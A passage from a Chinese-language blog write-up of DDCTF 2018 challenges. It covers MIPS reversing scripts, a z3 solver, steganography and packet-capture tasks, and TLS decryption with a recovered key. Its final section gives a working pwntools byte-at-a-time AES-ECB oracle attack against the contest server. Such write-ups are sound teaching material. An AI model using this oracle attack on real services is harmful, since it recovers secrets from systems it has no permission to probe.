class="keyword">or</span> ins == <span class="string">"addiu"</span>:</div><div class="line">                <span class="keyword">if</span> ins == <span class="string">'addi'</span>:</div><div class="line">                    <span class="keyword">print</span> <span class="string">'Attention:'</span>, line,</div><div class="line">                    <span class="keyword">continue</span></div><div class="line">                offset = re.findall(<span class="string">"\.text:[0-9A-F]+\s+?[^\s]+?\s+\$.+?,\s*([0-9A-Fx]+)"</span>, line)[<span class="number">0</span>]</div><div class="line">                globalV[rd] = addiu(globalV[rd], numeric(offset))</div><div class="line">            <span class="keyword">elif</span> ins == <span class="string">"subu"</span>:</div><div class="line">                rs = re.findall(<span class="string">"\.text:[0-9A-F]+\s+?[^\s]+?\s+\$.+?,\s*\$([0-9A-Fa-z]+)"</span>, line)[<span class="number">0</span>]</div><div class="line">                <span class="keyword">if</span> rs <span class="keyword">in</span> globalV:</div><div class="line">                    globalV[rd] = subu(globalV[rd], globalV[rs])</div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                    <span class="keyword">print</span> <span class="string">'Not expect rs:'</span>, line,</div><div class="line">            <span class="keyword">elif</span> ins == <span class="string">'sra'</span>:</div><div class="line">                offset = re.findall(<span class="string">"\.text:[0-9A-F]+\s+?[^\s]+?\s+\$.+?,\s*([0-9A-Fx]+)"</span>, line)[<span class="number">0</span>]</div><div class="line">                globalV[rd] = sra(globalV[rd], numeric(offset))</div><div class="line">            <span class="keyword">elif</span> ins == <span class="string">'sll'</span>:</div><div class="line">                offset = re.findall(<span class="string">"\.text:[0-9A-F]+\s+?[^\s]+?\s+\$.+?,\s*([0-9A-Fx]+)"</span>, line)[<span class="number">0</span>]</div><div class="line">                globalV[rd] = sll(globalV[rd], numeric(offset))</div><div class="line"></div><div class="line">            <span class="keyword">elif</span> ins == <span class="string">"mul"</span>:</div><div class="line">                rt = re.findall(<span class="string">"\.text:[0-9A-F]+\s+?[^\s]+?\s+\$.+?,\s*\$([0-9A-Fa-z]+)"</span>, line)[<span class="number">0</span>]</div><div class="line">                rs = re.findall(<span class="string">"\.text:[0-9A-F]+\s+?[^\s]+?\s+\$.+?,\s*\$[0-9A-Fa-z]+,\s*\$([0-9A-Fa-z]+)"</span>, line)</div><div class="line">                <span class="keyword">if</span> len(rs) &gt; <span class="number">0</span>:</div><div class="line">                    rs = rs[<span class="number">0</span>]</div><div class="line"></div><div class="line">                    <span class="keyword">if</span> rt <span class="keyword">not</span> <span class="keyword">in</span> globalV <span class="keyword">or</span> rs <span class="keyword">not</span> <span class="keyword">in</span> globalV:</div><div class="line">                        <span class="keyword">print</span> <span class="string">'Not expect rt or rs:'</span>, line,</div><div class="line">                        <span class="keyword">continue</span></div><div class="line">                    globalV[rd] = mul(globalV[rs], globalV[rt])</div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                    globalV[rd] = mul(globalV[rd], globalV[rt])</div><div class="line">            <span class="keyword">elif</span> ins == <span class="string">"negu"</span>:</div><div class="line">                rs = re.findall(<span class="string">"\.text:[0-9A-F]+\s+?[^\s]+?\s+\$.+?,\s*\$([0-9A-Fa-z]+)"</span>, line)[<span class="number">0</span>]</div><div class="line">                globalV[rd] = negu(globalV[rs])</div><div class="line"></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                <span class="keyword">print</span> <span class="string">"[!]Attention:"</span>, line,</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">print</span> <span class="string">"Skipping line:"</span>, line,</div><div class="line">            <span class="keyword">pass</span></div><div class="line">    <span class="keyword">print</span> map(<span class="keyword">lambda</span> x: hex(x), fp)</div><div class="line">    <span class="keyword">print</span> fp</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    n = <span class="number">1</span></div><div class="line">    p = []</div><div class="line">    p_all = []</div><div class="line">    result = []</div><div class="line">    neguF = <span class="number">0</span></div><div class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</div><div class="line">        <span class="keyword">if</span> isInstruction(line):</div><div class="line">            ins = re.findall(<span class="string">"\.text:[0-9A-F]+\s+?([^\s]+?)\s+"</span>, line)[<span class="number">0</span>]</div><div class="line">            rd = re.findall(<span class="string">"\.text:[0-9A-F]+\s+?[^\s]+?\s+\$(.+?),"</span>, line)[<span class="number">0</span>]</div><div class="line">            <span class="keyword">if</span> rd <span class="keyword">not</span> <span class="keyword">in</span> globalV:</div><div class="line">                <span class="keyword">print</span> <span class="string">"Not expect rd:"</span>, line,</div><div class="line">                <span class="keyword">continue</span></div><div class="line">            <span class="keyword">if</span> rd == <span class="string">"v1"</span>:</div><div class="line"></div><div class="line">                <span class="keyword">if</span> ins == <span class="string">"negu"</span>:</div><div class="line">                    <span class="comment"># TODO</span></div><div class="line">                    <span class="keyword">print</span> <span class="string">"Loop_%d needs negu!"</span> % n</div><div class="line">                    neguF = <span class="number">1</span></div><div class="line"></div><div class="line">                <span class="keyword">elif</span> ins == <span class="string">"beq"</span>:</div><div class="line">                    <span class="comment"># TODO</span></div><div class="line">                    <span class="keyword">print</span> <span class="string">"Loop_%d end"</span> % n</div><div class="line">                    <span class="keyword">if</span> neguF:</div><div class="line">                        p.insert(<span class="number">0</span>, <span class="number">1</span>)</div><div class="line">                    <span class="keyword">else</span>:</div><div class="line">                        p.insert(<span class="number">0</span>, <span class="number">0</span>)</div><div class="line">                    p_all.extend(p)</div><div class="line">                    <span class="keyword">print</span> len(p), p</div><div class="line">                    n += <span class="number">1</span></div><div class="line">                    neguF = <span class="number">0</span></div><div class="line">                    p = []</div><div class="line">                <span class="keyword">elif</span> ins == <span class="string">"subu"</span>:</div><div class="line">                    p.append(<span class="number">-1</span>)</div><div class="line"></div><div class="line">                    <span class="keyword">print</span> <span class="string">"v1 -= "</span></div><div class="line">                <span class="keyword">elif</span> ins == <span class="string">"addu"</span>:</div><div class="line">                    p.append(<span class="number">1</span>)</div><div class="line"></div><div class="line">                    <span class="keyword">print</span> <span class="string">"v1 += "</span></div><div class="line">                <span class="keyword">elif</span> ins == <span class="string">"mul"</span>:</div><div class="line">                    rs = re.findall(<span class="string">"\.text:[0-9A-F]+\s+?[^\s]+?\s+\$.+?,\s*\$([0-9A-Fa-z]+)"</span>, line)[<span class="number">0</span>]</div><div class="line">                    <span class="keyword">if</span> rs != <span class="string">"v0"</span>:</div><div class="line">                        <span class="keyword">print</span> <span class="string">"Attention:"</span>, line,</div><div class="line">                        <span class="keyword">continue</span></div><div class="line"></div><div class="line">                    <span class="keyword">print</span>  <span class="string">"v1 = %sv1 * v0"</span> % (<span class="string">"~"</span> <span class="keyword">if</span> neguF <span class="keyword">else</span> <span class="string">""</span>)</div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                    <span class="keyword">if</span> ins == <span class="string">"lw"</span>:</div><div class="line">                        <span class="keyword">continue</span></div><div class="line">                    <span class="keyword">print</span> <span class="string">"Attention:"</span>, line,</div><div class="line">                    <span class="keyword">pass</span></div><div class="line"></div><div class="line">            <span class="keyword">if</span> ins == <span class="string">"li"</span> <span class="keyword">and</span> rd == <span class="string">"v0"</span>:</div><div class="line">                <span class="keyword">print</span> line</div><div class="line">                offset = re.findall(<span class="string">"\.text:[0-9A-F]+\s+?[^\s]+?\s+\$.+?,\s*([0-9A-Fx]+)"</span>, line)[<span class="number">0</span>]</div><div class="line">                <span class="keyword">print</span> <span class="string">"Result:"</span>, offset</div><div class="line">                result.append(numeric(offset))</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="comment"># print "Skipping line:", line,</span></div><div class="line">            <span class="keyword">pass</span></div><div class="line">    <span class="keyword">print</span> <span class="string">"\nResult:"</span>, result</div><div class="line">    <span class="keyword">print</span> <span class="string">"num:"</span>, p_all</div><div class="line">f.close()</div></pre></td></tr></table></figure>
<p>然后将得到的fp数组，result数组和num数组放进这个脚本里面用z3解释器求方程组的解就是了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">negu</span><span class="params">(v0)</span>:</span></div><div class="line">    num2bytes = bin(v0)[<span class="number">2</span>:].zfill(<span class="number">32</span>)</div><div class="line">    <span class="keyword">return</span> int(<span class="string">""</span>.join(map(<span class="keyword">lambda</span> x: <span class="string">"0"</span> <span class="keyword">if</span> x == <span class="string">"1"</span> <span class="keyword">else</span> <span class="string">"1"</span>, num2bytes)), <span class="number">2</span>) + <span class="number">1</span></div><div class="line"></div><div class="line">fp = []</div><div class="line">result =[]</div><div class="line">p = []<span class="comment">#num</span></div><div class="line">equation = []</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(p) / <span class="number">16</span>):</div><div class="line">    a = p[i * <span class="number">16</span>:(i + <span class="number">1</span>) * <span class="number">16</span>]</div><div class="line">    b = fp[i * <span class="number">16</span>:(i + <span class="number">1</span>) * <span class="number">16</span>]</div><div class="line">    <span class="keyword">if</span> a[<span class="number">0</span>]:</div><div class="line">        b[<span class="number">0</span>] = negu(b[<span class="number">0</span>])</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        a[<span class="number">0</span>] = <span class="number">1</span></div><div class="line">    d = map(<span class="keyword">lambda</span> (a, b): a * b, zip(a, b))</div><div class="line">    s = <span class="string">""</span></div><div class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> range(<span class="number">16</span>):</div><div class="line">        <span class="keyword">print</span> (<span class="string">"+"</span> <span class="keyword">if</span> d[t] &gt; <span class="number">0</span> <span class="keyword">and</span> t != <span class="number">0</span> <span class="keyword">else</span> <span class="string">""</span>) + str(hex(d[t])) + <span class="string">"*"</span> + <span class="string">"a["</span> + str(t) + <span class="string">"]"</span>,</div><div class="line">        s += (<span class="string">"+"</span> <span class="keyword">if</span> d[t] &gt; <span class="number">0</span> <span class="keyword">and</span> t != <span class="number">0</span> <span class="keyword">else</span> <span class="string">""</span>) + str(hex(d[t])) + <span class="string">"*"</span> + <span class="string">"a["</span> + str(t) + <span class="string">"]"</span></div><div class="line">    <span class="keyword">print</span> <span class="string">" = "</span> + hex(result[i])</div><div class="line">    s += <span class="string">" == "</span> + hex(result[i])</div><div class="line">    equation.append(s)</div><div class="line">a = [BitVec(<span class="string">"flag_%d"</span> % i, <span class="number">32</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>)]</div><div class="line">so = Solver()</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> equation:</div><div class="line">    so.add(eval(i))</div><div class="line">print(so.check())</div><div class="line">print(so.model())</div></pre></td></tr></table></figure></p>
<p>由于数有点大，大概需要1分钟的样子解出答案</p>
<img src="/2018/04/21/又是一年DDCTF/21-53-59.jpg" alt="21-53-59.jpg" title="">
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h4 id="Misc2-╯°□°）╯︵-┻━┻"><a href="#Misc2-╯°□°）╯︵-┻━┻" class="headerlink" title="Misc2 - (╯°□°）╯︵ ┻━┻"></a>Misc2 - (╯°□°）╯︵ ┻━┻</h4><p>每个字符的ASCLL码都加了128，去掉就好了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">c = <span class="string">"d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb7b9b8e4b5b5e4e2b7b6b5b5b2e1b9b2b2e4b0b0e4b7b7b5e5b3b3b1b1b9b0b7fd"</span></div><div class="line">flag = <span class="string">""</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(c) / <span class="number">2</span>):</div><div class="line">    flag += chr(int(c[i * <span class="number">2</span>:(i + <span class="number">1</span>) * <span class="number">2</span>], <span class="number">16</span>) &amp; <span class="number">0x7f</span>)</div><div class="line"><span class="keyword">print</span> flag</div><div class="line"><span class="comment">#That was fast! The flag is: DDCTF&#123;798d55db76552a922d00d775e3311907&#125;</span></div></pre></td></tr></table></figure></p>
<h4 id="Misc4-第四扩展FS"><a href="#Misc4-第四扩展FS" class="headerlink" title="Misc4 - 第四扩展FS"></a>Misc4 - 第四扩展FS</h4><p>一张windows.jpg，属性部分存在密码备注，图片里面存在ZIP的文件头PK，用winhex提取出zip</p>
<img src="/2018/04/21/又是一年DDCTF/22-05-38.jpg" alt="22-05-38.jpg" title="">
<p>file.txt是一个充满字符的txt</p>
<img src="/2018/04/21/又是一年DDCTF/22-05-46.jpg" alt="22-05-46.jpg" title="">
<img src="/2018/04/21/又是一年DDCTF/22-06-02.jpg" alt="22-06-02.jpg" title="">
<p>很容易联想到字频统计之类的攻击<br>使用TextDecoder Toolkit这个工具进行字符统计<br>下载地址：<a href="http://www.kahusecurity.com/?page_id=13485" target="_blank" rel="external">http://www.kahusecurity.com/?page_id=13485</a>，解压密码kahusecurity</p>
<img src="/2018/04/21/又是一年DDCTF/22-07-11.jpg" alt="22-07-11.jpg" title="">
<p>得到flag</p>
<h4 id="Misc3-流量分析"><a href="#Misc3-流量分析" class="headerlink" title="Misc3 - 流量分析"></a>Misc3 - 流量分析</h4><p>包里面用ftp传了sqlmap.zip和Fl-g.zip，后来才发现是陷阱(巨坑)<br>包里面的smtp里面传了一些无关紧要的东西，一些网页，一些对话，还有一张大图image001.png</p>
<img src="/2018/04/21/又是一年DDCTF/22-08-49.png" alt="22-08-49.png" title="">
<p>然后将图片的base64编码提取出来，写进我们写的html文件<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"data:image/png;base64,xxxxxx(ImageBase64)”&gt;</span></span></div></pre></td></tr></table></figure></p>
<p>得到</p>
<img src="/2018/04/21/又是一年DDCTF/22-09-27.jpg" alt="22-09-27.jpg" title="">
<p>通过提示很容易知道是一个RSA密钥的base64编码<br>随后在wireshark中搜索ssl协议流量，发现172.17.0.3与172.17.0.2之间有ssl通信<br>猜测图片中的密钥是其中一方的私钥</p>
<img src="/2018/04/21/又是一年DDCTF/22-09-48.jpg" alt="22-09-48.jpg" title="">
<p>将图片的密钥变成标准格式(机器OCR+人眼OCR)</p>
<img src="/2018/04/21/又是一年DDCTF/22-09-56.jpg" alt="22-09-56.jpg" title="">
<p>将密钥导进wireshark，编辑 -&gt; 首选项 -&gt; protocols -&gt; SSL -&gt; RSA keys list Edit</p>
<img src="/2018/04/21/又是一年DDCTF/22-14-23.jpg" alt="22-14-23.jpg" title="">
<p>然后在ssl流量中发现解密出来的flag</p>
<img src="/2018/04/21/又是一年DDCTF/22-14-51.jpg" alt="22-14-51.jpg" title="">
<h4 id="Misc5-安全通信"><a href="#Misc5-安全通信" class="headerlink" title="Misc5 - 安全通信"></a>Misc5 - 安全通信</h4><p>这题比较快地写了出来，google找到一篇github的文章，刚好是对应的类型，然后写了个脚本就好了，文章地址： <a href="https://github.com/liamh95/CTF-writeups/tree/master/CSAW17/baby_crypt" target="_blank" rel="external">https://github.com/liamh95/CTF-writeups/tree/master/CSAW17/baby_crypt</a><br>题的代码如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> json</div><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</div><div class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_padding</span><span class="params">(rawstr)</span>:</span></div><div class="line">    remainder = len(rawstr) % <span class="number">16</span></div><div class="line">    <span class="keyword">if</span> remainder != <span class="number">0</span>:</div><div class="line">        <span class="keyword">return</span> <span class="string">'\x00'</span> * (<span class="number">16</span> - remainder)</div><div class="line">    <span class="keyword">return</span> <span class="string">''</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">aes_encrypt</span><span class="params">(key, plaintext)</span>:</span></div><div class="line">    plaintext += get_padding(plaintext)</div><div class="line">    aes = AES.new(key, AES.MODE_ECB)</div><div class="line">    cipher_text = aes.encrypt(plaintext).encode(<span class="string">'hex'</span>)</div><div class="line">    <span class="keyword">return</span> cipher_text</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_hello</span><span class="params">(key, name, flag)</span>:</span></div><div class="line">    message = <span class="string">"Connection for mission: &#123;&#125;, your mission's flag is: &#123;&#125;"</span>.format(name, flag)</div><div class="line">    <span class="keyword">return</span> aes_encrypt(key, message)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_input</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> raw_input()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_output</span><span class="params">(message)</span>:</span></div><div class="line">    print(message)</div><div class="line">    sys.stdout.flush()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">()</span>:</span></div><div class="line">    print_output(<span class="string">"Please enter mission key:"</span>)</div><div class="line">    mission_key = get_input().rstrip()</div><div class="line">    print_output(<span class="string">"Please enter your Agent ID to secure communications:"</span>)</div><div class="line">    agentid = get_input().rstrip()</div><div class="line">    rnd = Random.new()</div><div class="line">    session_key = rnd.read(<span class="number">16</span>)</div><div class="line">    flag = <span class="string">'&lt;secret&gt;'</span></div><div class="line">    print_output(generate_hello(session_key, agentid, flag))</div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        print_output(<span class="string">"Please send some messages to be encrypted, 'quit' to exit:"</span>)</div><div class="line">        msg = get_input().rstrip()</div><div class="line">        <span class="keyword">if</span> msg == <span class="string">'quit'</span>:</div><div class="line">            print_output(<span class="string">"Bye!"</span>)</div><div class="line">            <span class="keyword">break</span></div><div class="line">        enc = aes_encrypt(session_key, msg)</div><div class="line">        print_output(enc)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line">    handle()</div></pre></td></tr></table></figure></p>
<p>代码大致意思是首先生成一个对话的随机key，然后用AES的ECB(Electronic codebook)模式将一段嵌入<code>agent id</code>和<code>flag</code>的<code>message</code>进行加密，密钥就是随机的key，然后输出加密的结果<br>接下来是一个循环，继续利用刚才的密钥对我们接下来输入的信息进行加密然后输出结果<br>ECB加密是分组进行加密的，解密也是分组解密。分组与分组之间的明文产生的密文互相独立，且由于算法的缘故，相同的明文分组在相同的密钥加密下会产生相同的密文<br>加解密流程如下图所示</p>
<blockquote>
<p>引用自维基百科<br><img src="/2018/04/21/又是一年DDCTF/22-50-28_1.jpg" alt="22-50-28_1.jpg" title=""></p>
</blockquote>
<blockquote>
<img src="/2018/04/21/又是一年DDCTF/22-50-56_1.jpg" alt="22-50-56_1.jpg" title="">
</blockquote>
<p>而我们要做的事是通过这些个分组且明文加密固定密文的特性猜出flag的每一位来<br>题中以16字节为一组，我们举例也拿16字节为一组举例<br>首先我们假设<code>xxxx</code>使我们可控的输入，一般情况下的加密会是这样的</p>
<img src="/2018/04/21/又是一年DDCTF/ECB1_1.png" alt="ECB1_1.png" title="">
<p>但是如果我们控制<code>xxx</code>为十五个固定的字符如十五个<code>A</code><br>则加密过程会变成这样：</p>
<img src="/2018/04/21/又是一年DDCTF/ECB2_1.png" alt="ECB2_1.png" title="">
<p>现在我们记录下此时的<code>HEX_1</code><br>然后再通过Fuzz的方法让同样的密钥对我们特定的分组进行加密，如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">AAAAAAAAAAAAAAAa</div><div class="line">AAAAAAAAAAAAAAAb</div><div class="line">AAAAAAAAAAAAAAAc</div><div class="line">AAAAAAAAAAAAAAAd</div><div class="line">....</div><div class="line">AAAAAAAAAAAAAAA*</div></pre></td></tr></table></figure></p>
<p>然后将这些加密后的<code>HEX</code>与<code>HEX_1</code>进行比较，加密后的密文相同则说明明文相同，所以我们可以猜测出<code>Flag</code>的第一位是<code>F</code><br>然后依次类推，推导出所有的字节就好了<br>然后回到我们这题<br>flag共39位，可以通过测试id逐字节加再观察加密后的HEX长度得到<br>利用python的pwntools库完成和远程程序交互</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> string</div><div class="line"></div><div class="line"><span class="comment"># context.log_level = 'debug'</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">respone</span><span class="params">(recv_buf, send_buf, new_line=True)</span>:</span></div><div class="line">    pro.recvuntil(recv_buf)</div><div class="line">    <span class="keyword">if</span> new_line:</div><div class="line">        pro.sendline(send_buf)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        pro.send(send_buf)</div><div class="line"></div><div class="line">flag = <span class="string">""</span></div><div class="line"><span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">    pro = remote(<span class="string">"116.85.48.103"</span>, <span class="number">5002</span>)</div><div class="line">    respone(<span class="string">"mission key:\n"</span>, <span class="string">"You_session_key"</span>)</div><div class="line"></div><div class="line">    payload = (<span class="number">45</span> - len(flag)) * <span class="string">"1"</span></div><div class="line">    respone(<span class="string">"communications:\n"</span>, payload)</div><div class="line">    c = pro.recvuntil(<span class="string">'\n'</span>, drop=<span class="keyword">True</span>)[<span class="number">160</span>:<span class="number">160</span> + <span class="number">32</span>]</div><div class="line"></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string.printable:</div><div class="line">        message = <span class="string">"Connection for mission: &#123;&#125;, your mission's flag is: &#123;&#125;"</span>.format(payload, flag + i)</div><div class="line">        respone(<span class="string">"exit:\n"</span>, message)</div><div class="line">        m = pro.recvuntil(<span class="string">'\n'</span>, drop=<span class="keyword">True</span>)[<span class="number">-32</span>:]</div><div class="line">        <span class="keyword">if</span> c == m:</div><div class="line">            log.info(<span class="string">"Find char: %s"</span>, i)</div><div class="line">            flag += i</div><div class="line">            <span class="keyword">break</span></div><div class="line">    pro.close()</div><div class="line">    log.info(<span class="string">"Flag: %s"</span>, flag)</div><div class="line">    sleep(<span class="number">1</span>)</div></pre></td></tr></table></figure>
<img src="/2018/04/21/又是一年DDCTF/23-30-06.jpg" alt="23-30-06.jpg" title="">
<h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>比赛过程挺刺激的，依旧持续了一个星期之久<br>最后也是混了个22名吧<br>一年过去了，依旧那么菜<br>希望下一年自己能够找到自己真正喜欢的领域去深入研究吧</p>
<img src="/2018/04/21/又是一年DDCTF/23-37-22.jpg" alt="23-37-22.jpg" title="">

      
    </div>
    
    
    
	<div>
	  
		<div>
    
		<br>
		</br>
        <div style="text-align:center;color: #ccc;font-size:14px">----- 感谢阅读 -----<br></br></div>
    
</div>
	  
	</div>
    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/CTF/" rel="tag"># CTF</a>
          
            <a href="/tags/WriteUp/" rel="tag"># WriteUp</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2018/04/06/写一个ARP欺骗的命令行工具/" rel="next" title="写一个ARP欺骗的命令行工具">
                <i class="fa fa-chevron-left"></i> 写一个ARP欺骗的命令行工具
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2018/07/08/春招随笔/" rel="prev" title="春招随笔">
                春招随笔 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">W z</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">26</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">2</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">19</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/testzero-wz" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:testzero.wz@gmail.com" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-google"></i>E-Mail</a>
                  </span>
                
            </div>
          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WriteUp"><span class="nav-number">2.</span> <span class="nav-text">WriteUp</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB"><span class="nav-number">2.1.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Web1-数据库的秘密"><span class="nav-number">2.1.0.1.</span> <span class="nav-text">Web1 - 数据库的秘密</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Web2-专属链接"><span class="nav-number">2.1.0.2.</span> <span class="nav-text">Web2 - 专属链接</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Web3-注入的奥妙"><span class="nav-number">2.1.0.3.</span> <span class="nav-text">Web3 - 注入的奥妙</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#逆向"><span class="nav-number">2.2.</span> <span class="nav-text">逆向</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#逆向1-MIPS"><span class="nav-number">2.2.0.1.</span> <span class="nav-text">逆向1 - MIPS</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MISC"><span class="nav-number">2.3.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Misc2-╯°□°）╯︵-┻━┻"><span class="nav-number">2.3.0.1.</span> <span class="nav-text">Misc2 - (╯°□°）╯︵ ┻━┻</span></a></li><li class="nav-item nav-level-4"><a 